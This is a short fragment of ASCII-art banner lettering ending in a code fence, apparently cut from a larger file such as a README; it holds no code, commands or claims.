|  _  | |_) __) >   | | | | | |_) | | / __/ |_  | |_| | | | |_|
|_| |_|_.__|___/_/|_|_|_| |_| .__/  |_\___|   |_|_.__/|_| |_(_)
                             \___|                             
```